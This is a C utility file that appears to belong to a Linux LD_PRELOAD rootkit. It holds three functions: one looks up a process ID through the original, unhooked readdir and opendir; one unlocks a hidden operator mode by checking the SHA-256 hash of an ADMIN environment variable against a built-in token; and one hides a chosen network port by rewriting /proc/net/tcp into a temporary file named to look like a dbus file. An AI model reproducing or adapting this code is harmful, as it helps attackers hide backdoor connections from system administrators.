#define _GNU_SOURCE
#include "util.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <openssl/sha.h>
#include <dlfcn.h>

int get_pid_of_process_with_name(const char *process_name, struct dirent *(*original_readdir)(DIR *), DIR *(*original_opendir)(const char *), FILE *(*original_fopen)(const char *, const char *))
{

    if (process_name == NULL)
    {
        return -1;
    }
    const char *directory = "/proc";
    size_t taskNameSize = 1024;
    char *taskName = calloc(1, taskNameSize);

    DIR *dir = original_opendir(directory);

    if (dir)
    {
        struct dirent *de = 0;

        while ((de = original_readdir(dir)) != 0)
        {
            if (strcmp(de->d_name, ".") == 0 || strcmp(de->d_name, "..") == 0)
                continue;

            int pid = -1;
            int res = sscanf(de->d_name, "%d", &pid);

            if (res == 1)
            {
                // we have a valid pid

                // open the cmdline file to determine what's the name of the process running
                char cmdline_file[1024] = {0};
                sprintf(cmdline_file, "%s/%d/cmdline", directory, pid);

                FILE *cmdline = original_fopen(cmdline_file, "r");

                if (cmdline)
                {
                    size_t size;
                    size = fread(taskName, 1, taskNameSize - 1, cmdline);
                    if (size > 0)
                    {
                        taskName[size] = 0;
                    }
                    fclose(cmdline);
                    // check if the process name matches argv[0] of the process
                    if (strstr(taskName, process_name) != NULL)
                    {
                        free(taskName);
                        closedir(dir);
                        return pid;
                    } 
                }

            }
        }

        closedir(dir);
    }

    free(taskName);
    return -1;
}

int get_dir_name(DIR *dirp, char *buf, size_t size)
{
    int fd = dirfd(dirp);
    if (fd == -1)
    {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if (ret == -1)
    {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}

int verify_token()
{
    char *admin = getenv("ADMIN");
    if (admin == NULL)
    {
#ifdef DEBUG
        fprintf(stderr, "ADMIN not set\n");
#endif
        return 0;
    }
#ifdef DEBUG
    fprintf(stderr, "ADMIN: %s\n", admin);
#endif
    // verify hash of ADMIN == TOKEN
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256((unsigned char *)admin, strlen(admin), hash);
    char hash_str[SHA256_DIGEST_LENGTH * 2 + 1];
    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++)
    {
        sprintf(hash_str + i * 2, "%02x", hash[i]);
#ifdef DEBUG
        fprintf(stderr, "%02x", hash[i]);
#endif
    }
    if (strcmp(hash_str, TOKEN) == 0)
    {
#ifdef DEBUG
        fprintf(stderr, "Verified token\n");
#endif
        return 1;
    }
    else
    {
#ifdef DEBUG
        fprintf(stderr, "Invalid token: %s expected: %s\n", hash_str, TOKEN);
#endif
    }
    return 0;
}

static FILE *(*original_fopen)(const char *pathname, const char *mode) = NULL;

char *get_filename_of_overwritten_proc_net_tcp_w_hidden_port(int port, const char *path)
{
    if (!original_fopen)
    {
        original_fopen = dlsym(RTLD_NEXT, "fopen");
    }
    FILE *original_tcp_file = original_fopen(path, "r");
    FILE *fake_tcp_file = original_fopen("/tmp/dbus-aEgRdcC", "w");
    if (original_tcp_file == NULL || fake_tcp_file == NULL)
    {
#ifdef DEBUG
        fprintf(stderr, "failed to open files, original_tcp_file: %p fake_tcp_file: %p\n", original_tcp_file, fake_tcp_file);
#endif
        return NULL;
    }
    char line[1024];
    // copy original_tcp_file to fake_tcp_file, but remove the line with the hidden port
    //    46: 010310AC:9C4C 030310AC:1770 01
    // 1770 is the port in hex
    char port_str[5];
    while (fgets(line, sizeof(line), original_tcp_file))
    {
        if (strlen(line) < 13)
        {
            fputs(line, fake_tcp_file);
#ifdef DEBUG
            fprintf(stderr, "skipping line: %s", line);
#endif
            continue;
        }
        else
        {
#ifdef DEBUG
            fprintf(stderr, "line: %s", line);
#endif
            strncpy(port_str, line + 29, 4);
#ifdef DEBUG
            fprintf(stderr, "port_str: %s\n", port_str);
#endif
            int port_num = strtol(port_str, NULL, 16);
            if (port_num != port)
            {
#ifdef DEBUG
                fprintf(stderr, "port_num: %d\n", port_num);
                fprintf(stderr, "hidden: %d\n", port);
#endif
                fputs(line, fake_tcp_file);
            }
            else
            {
#ifdef DEBUG
                fprintf(stderr, "MATCH: %s", line);
#endif
            }
        }
    }
    fclose(original_tcp_file);
    fclose(fake_tcp_file);
    return "/tmp/dbus-aEgRdcC";
}